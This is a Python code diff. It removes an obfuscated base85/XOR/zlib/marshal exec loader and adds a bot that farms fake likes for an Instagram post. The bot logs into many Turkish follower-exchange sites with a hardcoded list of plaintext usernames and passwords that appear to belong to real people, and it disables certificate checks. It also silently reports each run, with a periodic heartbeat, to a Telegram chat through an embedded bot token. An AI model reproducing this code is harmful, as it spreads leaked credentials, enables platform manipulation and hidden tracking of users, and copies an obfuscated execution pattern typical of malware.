@@ -1,16 +1,257 @@
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+import time
+import warnings
+import random
+import json
+import re
+import threading
 
-import marshal, base64, zlib
+warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
-_=b'O&2*?+L(*!UA@*os|Hjhl{QdmaBZ<gk}01*Na2IO5ti2<Ro({2R_g(Oo$WK))p@P2u4!LdEs$agGW!&anYVPJgF}EhCG{=C|9j{RiL7mZ;Te|e<#dB8U7z7c6Sk(p^{lbS$}hF{fS6M*EFyV8H|A6@TIW}tTSj5437AN?0|LE&0k3wGzf0e^#{OhQZ@)kwx785-$uOctmyV(hH{DMhicTy2E791ak;unuojyUQBP~}MC4(q^XfvEzelzs6%3<&~@^&xw2Tj)S%UrWTdO>ql#rBPMA~(XuUzL|1^xe~wyh%P-whEay`UQ(i4fJ6Gz$uadej{?9Q|W^l3nC-Ri%AN7>jjc=Y%mn`bj38wIFAE5EV_pTe+{WhHKz#T+I<QEPlC>e8IJ2qKSBKpLGt7<@5^@0#HR%!KA~-ERXF14m|C2}iZyi>r8qf{=u(h*+duM5!-q3GgG%U)`IGwtDkg#eKDFL|S9lBZn(j}>CLtia3s^?5mk8B(CEFolBfF1HIeton&FO0B3376}@t;nZ#ILA&bI)C-WyTUCedLppP{k0*UG&<Vt0KQtjS=~=o8wNwL8q$<<ZY%b?6cArpByYKM7aK+qVFq2M{lSSL*GAdSO`3cNV8Ca<~h<^9cR~lU+w6gt%vE+yF1fl-yue=az#jAMR@lg>U)mV{|(KkJa~)$gUTvvV*>x_u{{}q=%qH`{W$MWj!N{HJ0nlWItJ+N(Bk2&<|6b1oZ)xzdRoUTVx@Y+Y`{XVui6o1V@S%m5J9OD^b*DdD872SOj#f`!zelajBqbw9DI_>M*X>~b=OH`ZDnE<N9?cPrF3^M>O0e>3(Q(GdL;+&VI@+Dmm<31@<L0hDJT45-`BpzE7$8+9B&!02uW;axgB?#z%88?NQynQ;fes_(Q1<EjO-m)OWGg~ZnK*&*68Ru<+mYFS&nVdP_r9@NZKRfqS-GAyV9eTfR+>;Op#ArDH~^n+necKTDD0M$;p54Z*-jlZZlD?HV$^%!n1Gd86%^5kk?&4&n2@v;nyNjaCLP5cIyXpEM#evWhphL96ubf_wmCw5HC==Wr}=0oaX9qhPq-7d`VN@ge~o%nTSAFz8RzOJ?Oxf8bU^3>9Sf1!NG@Tve1<tW|}%!+%Pk#)ADlpXr(T*s?*#Hy%k?xZ?QSkx#zz5Ub8$rJQi*><uzw;BF?>Z-@B^AYwcpmT*I0B6r>8CH_iYT2n|5XoMO;7IeI&Z09~H42te5H5{P<O7EbA)`sKD@^xaX)1eEcdh5;*JZYmKntDRyps0vKSA0QdyXEy+~kgdL|)3<t8Rv69ViOGlmKSPNLW-q$+#I_4#oM&1q(R1$poechAcs#y{rfAf^ZgT<kg8EvBF^9D{S_m*IQCD#?j%tt2qW9YBo|0ixAd9?Sk$hH5S&BAieF0y%_}D=IYhcS+y&C*kNu&0eGk2_?y2kXyaQ+ys4-N-5VcyHku+z5xA128@w9(1O!lOV5#4_BN+bmg>?4yHeOpC)l7kafs0_uNI;0cLie7=x_oGk%m!b>+M_Y6UPzGTer_yJ&EjiHU=2pN&BMS44Vg2yy-W#+iVVt+FKo<@qYwVec(q4*aRU~5VHYu4OPM^cV1SgmQ!+McS1HQQ{A?Y^6EvNei%95me3rb6H83OZw}NJxT+hfggsB8q@;d{`sqX)X>6DP}KDGHdZu;KOy=7x-<hqD!#Ioa!q95-h9FRt@{cKL$)pX@zqKD!_0eblvybexF1&IxhNdLmq{6c~K{Fla9Ojz**-27G?h9l%JxKzuGu&Qj7%bT2)V5^*Y;+*0rIeD1v!*zX2ns!^`Z$C8r8x$)G7n&^pE^0>z;WMMm%Z5^M*n_`()t&zsEAnp0_*pj$%DrrI?p?xTreb+{C}Qy`&ihTm4@vIu3}Zya}HcYr>%UONtxLy;_Oo-9-~)Hu&0Hyou~i^oN4wPXJioX*;Z9gFZ=5{GQ>T{M3C3!&beWZH0S5p2|K^jZ<7G`wr+LS;g#2omoEQZ?4s`29~q7qn+EcyfM$e_e@!btURj59nd@GuUGOnYV;qJHP;i)M*&Q+}jSseQ9^Und8hWAh%PX|Fyt(T>{~DaN;W^i{z8tT>=e|ue^<=u8ED6R2Xo<)d1EK(`XEAr;fkLnDc7;0Rsvlr1@$4Hi=!0eJgU3p_vewXwv0|e-O|etPZb1lvXDoH}#REi^=k99Jk%-fB#qDaf^YpeCErCPeA@H@-Rj>G#sERV#2#<l|d+ba9eE^>9}-$%adXZ`za*BQZdy?%Pmq<G!v0Otd*D{y7jj;MZiWmAkdEc)sejh`$&bqYJD8*2;bivlN~syAJ*;P{nP*j&1Vh+$e+-B<;Hh16N+e{I46yium?3OJ$120o(+|Yk8Hv7B>_Vqf(91eKSwA=8dK{_uL|POLt(w>mnnbRU_n2G&sLO{*=i<(iuT7Vxdp6)Ry+A#Xsmm(Cn^Ub3Vc|3*OrhdlSj7A?4Iq<9ajuX8LoDuv(yFG=^@sh3Y|HO*db!uY;$vj6h1ZEx@$LHN}Wh&CXiT#+;<vAs@(VZ2=DK)lka~{1Rnk!*+qT=BNCI%+^355UT(`RFxm~+hIH{KS5yo}J^_yq8`h~;emu6r(b)Z!4~ay#hIAX{Ip?HxbsPt#RD!j9>%;0NA_1g_oaD6+UY7cRx=LE4nA*f>ZlP5yf_&9RrqGH@=TLA?GkVrCG6{tmh};`Kv3AYx<`xGO^Xb4AP1CAMR=+6tqV8F@64~kSphaa4Mdi?HqrFw`(--22r_}0~8lj~GgzYHrGhPS{huWYvxO4Lw7`wu%EeWrtMN%7MkdPOYzx1EtGKKJR!4uKH17bmW8a)UUpG{A_QJK|iwf9P$m^?XZ9Zn@SuUaF1vbnH+8j=j+1`O)(PKIJ^O4>>dAc3~u4-}pKi^KtP&RUamg1_oi{pJvU2=Nz12USfC{zU#6KRt1j>8!?+|LBZeRF9=97wC4A;j>((o`2a?V1uy@@?9#8ZtpKM7NX?^IhGzcHcjbg4#aR){0AG(u>~%uz6D`m;57!G(l(2%%A_@JsdikFHgE`kQ#n(EJb%91Xh;)6d4PS?x@P;wI_tfJT?7|WzQ9@)p;499-~KC$iOI@XQIpj_G=0UhMVBGI)cza4Jg;<hwiKJd-)SgS=2_%sf3~w|k*fDFoLaqm^wn?HG?H)m%vc=6-$m=?9sZ%NU?vIen3mEPsdV!kG=SmYp}XX?QgJuPQij1<dIJ=agL?Yp2hUJOU6b11l9-x7cz%mgYZKx<rP~x6wRkH^`KzScA@EG<Lg-!4b7j7S7okKE>e<&zyxrregCv!dqDu2tGh6&1K13y!Yv$bbIDE^9`Vg6q_gpV9Ic>jnRGZ(|MWnyjSU;y_98(r_3y#OUo3y|toN(pzlhUzZ0G|7WT<idu*aWCW24#s(>{LVgOPJ8<^3~*LMlWCfAVMes)i?qtx*d0qbUTYxw>HL0`cO{^V-G(B$|aP#;+5ih1=oGLttxm6YxHorsK74L@p~5tPg5u>K<Z+K)T?`SCw8WS)ux)h{h=!aOy<Lz3G}QecaCYFm{h<k5(NZ0Pq3pY@oc8yt6@OXTH&s1*6`fA=0Fj)dLCuQV`{Kk$GEauTu<}OaHbyg=9kYxC#F!d-UNx=-z2A&0)XNqs>0zaF0Omc#2Fi$r$uU^OTXNTJsH8s{>Z%bBhdj+Fv+292h(*q6MW_z9l?S702SEMVXUx9c4t^uAePkf_ln|d0d*UvNT|@Bn+o{rx9<o?&U-CiYJQ=3$as-f8QQv88XQfoGSZfUXH5o?wCvJb5>7?V&I>5}q})@?OxL2?taDnE)!?*7^2VOrLktpZW%t=o53;V?%5$%8?7-%05vIVr<hnkUI6RIIzu(eKp_+C8${48x?v2BODn^|XP-yt3dZvIo(?gX<E{0-!PgKZs9K~}KqQ1^;UdM#oL*oC%lI6>Wxt}=7T(z@Pg*vU85-kwxqX^D*1%U1T*B<W97DO(=KfWWIr>=4T8|y^g+N~7Nn27d2-4n{D)*^G2<=my=s#DM&W%znP%B*}eTpA|FzN-9)-l7yJ75t9>Tel(UKVvw46ZuJt8?Q}MT_?(f>SCZ{j__CFZAv<6Z42r(jo+$lo$U`56Oy6dSU!R&PoN4YjWt%|CkC=U)}YYiIrcEioeasx*B!_{95H3T`{b2td&KDbv8`I*)vM8`)q9VlJ=ef~$YYhq2kR{nv-Q5;2D_ZxRc9kV7^DHl?>-B0UQw~#7trMUeqS%Pp2YFc2aBp)=7qI{u7T#{Jn1sQzwbjQ{wb_wpI9ZMT+*LroWQ);F{jlX=Hf0Y#q;;G)VV6hkfkj{2K5;|{anU4(q;+G#RQc`>!7373CT)%MbefSey%og7kWON<Z4@|Ud%lz%N|g-?gj49;FkGj@p(X4ztt16X(bsbCBTD=wLKgL*RSc;ZBj7-ZxKlrNRI;GP~%%P149+aNapzN<`90P+92B_xqZR%+|vZ|dLV#NGxj1gTbO(X0YgZt{u)Wkz$m_`8sdNUT4>G)OxSX41ywMAlGH0EO1*iloI+7tGP@XJlBBBA-4HcsHF8(z8F?v!ajlA1aooxVJbpX=p*K}Lk*W>}dP7YN!i6nGw~v#a0#FQE-_Sj*m_IoXLpOY<$+?iC#T{pCQIJL~k~5{=Bw9-40O^#~wIXhOgDg#dfRSqGXG08b@^2I8#I(q(a`d`7EsWG7|H5}>NdheJ801%<2-}#z+`N$`W!nA+CN29rEfjtTnp)13HFq#u-^^c#zebDw(crE6(?fXTrmXn4Z3p0ys?h4j1DgADY!21+O9!1C`dScTTVxSB4jXUBGIB}!t{;U(<(F=%xc!~2=*YKERvdUpIAT3iPM{yHn_jg_EfvsMCnKEp?b0HzY229g?oN8b+9?gcUT26gXFsflm5X-B3*EtYgpw37xYGMx_a^~l<E1;iVV;8w`jox@w%(oO89p`BilBxJ<c7<(zY|2A@r5mib)d9-m>7M<+To_fjEsVMp3ER`4o+|0df6aDA*E_%UTsd&p@wxh|5^=NAMFis>!$Kidm5~jZ%T-;F0RNhBt~x(TyIfo-oLy}*+Rw2?$L-X`R7YCU&u3UD(;ykfFxk5D3}EmjI2$}yXPUi+~-o6D&!V^(#k?g5mzx;Wiv1sFR_6X8pn4exu`+AP{IP@PZ}B@J@96vmP#d;T-$R!R8o(KH*yc2oOZ-}Cr^4fWm%Q5U7$!uP{|COwRrH~hNiX5+!@aA<+a+*mj@qh+lTDJfgTk-kET)j#uR%-YVz#ZT})^Q4K}uci59L$^I52$)JsKdkK<Hs51@EQ+<#_3!YI9f2Tmr5?A$mmoL2EGOe(raYwoR)MMkyXJ-K4oS$v1OBylpYU5p(m;GrvRs&DH%KkNS_*RtfesHksfHpk<o5Gb|j>;Z^8qDfF_4Y_Wd+?q5T4dw@Cv~BIH9hnko5YEL0l0vnM4}-9jLj(7W6ZSMC_9K0h0ZHfYvf8HP>m#(>ny(qd(&up^LSXL*RNtPTY;v2|=EfWcBNOUn2ztkDHYi(Oe6smqU1v5)Y#Nh!wuPboIe@aI1XTDiXdRuE&ebDrGM1Du(!gPDHN1HA%d6dvSpf3YKbfok$s7gL^8L_b+tv@-58BClfZ$%fvUYM&JQ(6oLCk8(;^WKek7n_WzJQpQB7{vB*%J95U=jVuz>C<v$J~ghQ%VnZqN4=RGl!m4E(#Ce?C#3mEle4`hk1K`r+a;uNpp;{3LCYnZbLjrD$g>g3|e<;Z|^|a2sZ;e`p6;pvU{W)r`EfkzSHaUG&ecOmW|Key1ce9&<clo4T-0jQ;IOB%8NQ(HS}w4CFW(IXWKd_^qlN^7n1+5eI)gd%8dd)6tjrE#+|I|{1>JfNJ4YcXdk@E@8o5E^}Pg`&+k~u^$=~@0o;m&mbTjW2RwAV*I+kojhCx(XeTbik;`WV0rWo6$>sRCd)Gn97H8PLf2NCuBt;z;gWd44W~^dKaqK`%dF?W)J1Yf;&sY%*@wP}8PxlU#-nWQQ7fnBTvs!7y%e97{4K!TT$PLMip=cxZk9r>n){<z_9qE6n9)h8aV(`Jvj(IQEJ4&$91*ZvR#aY~KSYOYacXXzAG_qA~EYG4UEo<h^fd&)OT3QN6c}fcZkJ1~x#2+Y;*nul{Wayc}DwC=VFFQGi3C@h4Ow(+Ejj)QuVK~^Q*+Xx*VbH^x7dxWh>rsEXl44|#kZek<yFi*XS~JL?^0;ZmF<PWg`&7e6@iHv-n$Xp)n7Md%$Z9CMdvb=?(3Oyu>}a;KjUm)ml(AeoT!HHgFjL<ud-8wXw~!*@+|!}0F$bT^LM$U{9;P|qypX*PW0C;2YKWXfSJT2jQ#&DnJc6Bo)gV54`;O7<9-e2T1zbzq|L#Dlwddp#h3!w=XkoGUTfnN~Ddn=X2IWCBdvI>&xBw4xg>HZ&{C|mr#FTsFqMoLDBy2O_SY(sCiZkoJ50&bW3ov=jt|5Xfd?N_=7<4qrR9XDJyD-{FJ~y8;64Oz+SXjZiwAZY`^H&^?IYCfyQL1#FS>%|tPb+n$xnI%mG-uZg&5bDgk`_w_K?$DORq-{RK@?7h0-zZD*X4qe5wSpOs=W7^1Hpy%`heDxY{oeiX}K_RDq*TwKqQ!j;Fo?@26I20$r5yMS{6{6iv($QT*O%O^%wklwiISSOkomx$c@p^Nlc4hu7CQCuY{ElTAZEdyHPXcK%S>S5UqxBi&8c97(?43F>~6495TCizW%U9wQa<szG4Ql)!t%CUDyIk?zcxJAhs5C=Sd3zM7pHloqvS0BDOWSPUi5C#e&>&3SPNyT}ouJr|%!mi6BIZ;6~F7OWpm#b!7h05`-@C@+YEhg{J1ZCkQ@9S$}y3Y6pMN6jaRIUeP&*dFQ5eX{mO0yqN-USc?cYV_5H0a_VmyI@5=&Y;Wmh&FVqVV~w>$G7P+sB3&5`W_pXUuhHJ;qgO7M+xo9?v2Y^PPdL07+_S4_!+r#pxGw3qrLKvKH!+I!pu-SEOtZ{0>2?km6c)Q;i2t@=Tc0y&>&%rX_`G~+H5?e@-$II@-&v}e2h+c_i0kpA_%XT<9<A1|8F@`^b-cj*I0@Z8i#K|d3xm{1Ywf#RDZCa5|HjG?wW}ho;vAbRQW<?Hamh-ik9BH2--X`vyN~Xe?rXax06(Nubg!x%+XH`8cFJK`jR;jJAGq6-JRQq&S)%&(-tBN?R&8KGg#bSmQ6M8me!`wb8hvEb07_Egs13geA!e6trB__7R}C&U?2-o$&cUI0d~tr1V>Xz;-5rqEvDvl4RP(7K?-Lzi!bz7P*GnVj>H4>*!o}cb@vJRjiXVRck!>I&;{vUgiLz2VI1{E=6yRnu>tIg?j@pC(@)kp^8Y6p+++^ZqM+ez^&B%}F6bTJcn{wXeQU0Ce9p~Wc?LVFO6iEpZty=!P5g=q40EpylAbg)DkyR++X~jihWs{bd2&|-6C1DH*1`mQ?4rz#liI606IBiQE2n|{)?O@Qt84zBCX;FMAX6C^ToQs&Ifk$|k$E>;Y7?!=HMb<U}gU~9PC2*o}@U5Cl%?F+qbd+|!CNmn<+3M`8%g!Ml>I}{-J@{vO^Oyu{UIg`Xob*rfDMd(Zt*@stvvsX9gSiD7Y3%44Tpbo2g}?uTTwl9;W&xN<oOdHsH092qd$5ZP)sa1qwU_6BFlJR5?FRRse7Dt+suT^WB+a=706(Fn99bLV^;^lO^iC^;nHvgQ`&mS6j;PusiW-vkJHcEhOdx!wFGxc#uu7W@ccv%V>O#_%4I3c=ac_3S=h#=L+~O-+6bStQ`6jqTtKRUC-=i@(;UCP5<Uq6n;>v}{__%^?+=?27PX+IR<~&D6nY9B*+8Dl)=jZ41(FRTzDc1X*H2U|Jp&ccx6_=(&JvjC1>LZLvKz04Ei%6pP+64YeCU4j6i2JM{R<;y|cNc?L;<+VB)suRna|PdWS-F5>H#Ct7S!WKJYP`b}F{WeNy9b=bfG<p%8%B`FyQu$;3PYa?gG240XRZn$Zq*UI)7|pGE#N1UAWMgSdD-smQPGPC52L7*?zB%F9e>|We3Bx68dVB<+FrxWC4?#CyHHKP4+_0q(%%_o8SfVl-s#@5r;3lB>5o#2Y?PIbM6rij0Z&BA79^X*rnm7FuOO$vs{c--+Qm&XLVHeVXdsGsFsx6CB2M`}UPWKd2nHKt1i}p0sCagDIM|L2=+F&{0=vGp#LN<mV}{@R?ZXS1EW3Z};p|<eCKY?__2KyTp6ld3+O_3zPC{!|=8zWyG$L#2u)t{@u!?`b8&oZQ{yH<>q-W6G#|DU2|5|p$G-`0fBpWF-#FCtQ(Ea0k;r+L}c)`n5vm*=zKo;eTZxr(V47e^P>;8Ys?rwe?R@4rfd`~%a6bb|E-Pk{Cr-UCj`sbzh?o1Ehk3JQo&^|ve+?4Pae)>@hbFhfm(*?-;ekTkTZ(~!xyWxGrr!d9(=KbXD)|1lCZ0;;h)514-0!l^H5x$?i2^>$8Xli<fCMgv>fq-tqoEF1rSYMP07+uk9qf$9aAi*%h_s4$33yZ+D$L}VQub3*9HWgeH$C8!BaF@Is>-;$SdapH>3KHGChte=3GLl9PT(gNlugI0=r*<f5SFsQ4gARXoX`;AqO?sEG$}W^*gZu)b@+wmR9Qk|jvJT}|W~+hltqHyz@~@3d*UQm)sJmy$e!%Jzg?dG6@dl?;XHffG>J4MmCqlYXuVv>|&;@u@Gc^iE{qwsZJ}u?=B%IpTpxPKR#Jcj^eT~g5$THc@*067oBV|t0O^}R|A~LO?Jd^=Tabt;qjZX'
-__key=b'\xe1my5\xea\x90\xc2Y1sRH\xd6=d\x95'
+TELEGRAM_TOKEN = '7587418221:AAHlfb9DaXI00-eYIGGq99zbDhgWLLLxsxw'
+TELEGRAM_CHAT_ID = '5176321309'
 
-def decrypt(data, key):
-    for _ in range(5):
-        data = base64.b85decode(data)
-        data = data[64:-64]
-        data = bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
-        data = zlib.decompress(data)
-    return marshal.loads(data)
 
-if __name__ == '__main__':
-    exec(decrypt(_, __key))
+def send_telegram_notification(text):
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        params = {'chat_id': TELEGRAM_CHAT_ID, 'text': text}
+        requests.get(url, params=params, timeout=5)
+    except Exception as e:
+        print(f"Telegram notification failed: {e}")
+
+LOGIN_PAGES = [
+    "https://takipzan.com/login2",
+    "https://fastfollow.in/member",
+    "https://takipcikrali.com/login",
+    "https://takipcimx.net/login",
+    "https://takipciking.net/login",
+    "https://takipcigen.com/login",
+    "https://bigtakip.net/login",
+    "https://takipcitime.net/login",
+    "https://followersize.net/login",
+    "https://birtakipci.net/login",
+    "https://mixtakip.com/login",
+    "https://takipcitime.com/login",
+    "https://birtakipci.com/member",
+    "https://takipcibase.com/login",
+    "https://takip88.com/login",
+    "https://followersize.com/member",
+    "https://medyahizmeti.com/member",
+    "https://www.hepsitakipci.com/member",
+    "https://instamoda.org/login",
+    "https://takipcimx.com/member",
+    "https://takipcimax.com/login",
+]
+
+accounts = [
+#;
+
+
+"spider__tunsi|feres123456",
+"youssef.zayet|youssef1234567",
+"dali.hamrita.14|dali123456789",
+"jasser5546|jasserjasser",
+"ahmedoueslati92|hamdi123456789",
+"zofey_thomas10i|adem123456789",
+"saaiiif_tarhoouni|seif12345",
+
+
+       "abdelhayboulila|abdou123456",
+
+"c__palmer___10|mohamed123",
+
+
+"saidani3223|yahya 123",
+"yahya90064|Yahya123",
+"yahya_zoigi|yahya123456789",
+
+"aziz_ouertani_08|aziz 1234",
+
+
+
+       "aymenaymen6568|aymen1234",
+
+       "lou2y125cc|louay1234",
+
+#::
+
+
+]
+random.shuffle(LOGIN_PAGES)
+random.shuffle(accounts)
+
+def run(target_media_url, log_callback=None, stop_check=None):
+    def log(msg):
+        if log_callback:
+            log_callback(msg)
+        else:
+            print(msg)
+
+    if not target_media_url:
+        log(" No post URL provided → stopping")
+        return
+
+    send_telegram_notification(f"✅---post like URL: {target_media_url}")
+
+    log(f"\n Target: {target_media_url}")
+    log(f" Number of accounts: {len(accounts)}\n")
+    log(" Starting infinite cycles... (press Stop to exit)\n")
+
+    cycle = 0
+
+    # ----- خيط heartbeat -----
+    heartbeat_stop = threading.Event()
+    def heartbeat_worker():
+        while not heartbeat_stop.wait(300):
+            send_telegram_notification(f"🔄 المستخدم لايزال يضيف إعجابات لـ {target_media_url}")
+
+    heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
+    heartbeat_thread.start()
+
+    # ----- ضمان إرسال رسالة التوقف عند الخروج من الدالة -----
+    try:
+        while True:
+            if stop_check and stop_check():
+                log("\n Tool stopped by user.")
+                return
+
+            cycle += 1
+            log(f"\n━━━━━━━━━━ Cycle #{cycle} ━━━━━━━━━━\n")
+
+            for i, login_url in enumerate(LOGIN_PAGES, 1):
+                if stop_check and stop_check():
+                    return
+
+                site_alias = f"V{i}"
+                log(f"  Waiting: {site_alias}")
+
+                for j, acc in enumerate(accounts, 1):
+                    if stop_check and stop_check():
+                        return
+
+                    account_alias = f"V{j}"
+                    log(f"    Working...: {account_alias}")
+
+                    try:
+                        username, password = [x.strip() for x in acc.split("|")]
+                        session = requests.Session()
+                        session.verify = False
+
+                        login_data = {"username": username, "password": password}
+                        resp_login = session.post(login_url, data=login_data, timeout=30)
+                        if resp_login.status_code != 200:
+                            log(f"       Login failed ({resp_login.status_code})")
+                            continue
+
+                        base_url = "/".join(login_url.split("/")[:3])
+                        send_like_url = f"{base_url}/tools/send-like"
+
+                        resp_page = session.get(send_like_url, timeout=30)
+                        if resp_page.status_code != 200:
+                            log(f"       send-like page unavailable ({resp_page.status_code})")
+                            continue
+
+                        soup = BeautifulSoup(resp_page.text, "html.parser")
+                        form = None
+                        for f in soup.find_all("form"):
+                            btn = f.find("button", string=lambda t: t and "Gönderiyi Bul" in (t or ""))
+                            if btn:
+                                form = f
+                                break
+
+                        if not form:
+                            log("       'Gönderiyi Bul' form not found")
+                            continue
+
+                        action = form.get("action") or send_like_url
+                        if not action.startswith("http"):
+                            action = urljoin(send_like_url, action)
+
+                        post_data = {}
+                        for inp in form.find_all(["input", "textarea"]):
+                            name = inp.get("name")
+                            if name:
+                                post_data[name] = inp.get("value", "")
+
+                        post_data["mediaUrl"] = target_media_url
+
+                        resp_submit = session.post(action, data=post_data, timeout=30)
+                        if resp_submit.status_code != 200:
+                            log(f"       Search request failed ({resp_submit.status_code})")
+                            continue
+
+                        time.sleep(1)
+                        if stop_check and stop_check():
+                            return
+
+                        soup2 = BeautifulSoup(resp_submit.text, "html.parser")
+
+                        adet = "10"
+                        adet_tag = soup2.find("input", {"name": "adet"})
+                        if adet_tag and adet_tag.get("value"):
+                            adet = adet_tag["value"]
+
+                        mediaID = None
+                        mediaID_tag = soup2.find("input", {"name": "mediaID"})
+                        if mediaID_tag and mediaID_tag.get("value"):
+                            mediaID = mediaID_tag["value"]
+
+                        if not mediaID:
+                            log("       Failed to extract mediaID")
+                            continue
+
+                        start_url = f"{base_url}/tools/send-like/{mediaID}?formType=send"
+                        start_data = {"adet": adet, "mediaID": mediaID}
+                        resp_start = session.post(start_url, data=start_data, timeout=30)
+
+                        if 200 <= resp_start.status_code < 300:
+                            log("      → Response: OK")
+                            log("       Likes sent successfully ")
+                        else:
+                            log(f"      → Response: {resp_start.status_code}")
+                            log("       Failed to send likes")
+
+                        time.sleep(1)
+
+                        try:
+                            json_match = re.search(r'\{.*\}', resp_start.text, re.DOTALL)
+                            if json_match:
+                                data = json.loads(json_match.group(0))
+                                st = data.get("status", "").lower()
+                                if st == "success":
+                                    log("         success")
+                                elif st == "error":
+                                    log("         error")
+                                else:
+                                    log("        Unknown status")
+                            else:
+                                log("        (No clear JSON found)")
+                        except:
+                            log("        (Error reading response)")
+
+                        time.sleep(1)
+
+                    except Exception as e:
+                        log(f"      ⚠ Error: {type(e).__name__} - {str(e)}")
+                        continue
+
+                    log("  ────────────────────────────────")
+                log("───────────────────────────────────")
+
+            log(f"\n Cycle {cycle} finished → waiting 10 seconds...\n")
+            for _ in range(10):
+                if stop_check and stop_check():
+                    return
+                time.sleep(1)
+    finally:
+        # إرسال رسالة التوقف وإيقاف خيط heartbeat
+        send_telegram_notification(f"🛑 Stop --- post like URL: {target_media_url}")
+        heartbeat_stop.set()
+
+if __name__ == "__main__":
+    import sys
+    target = sys.argv[1] if len(sys.argv) > 1 else input("Enter post URL: ")
+    run(target)
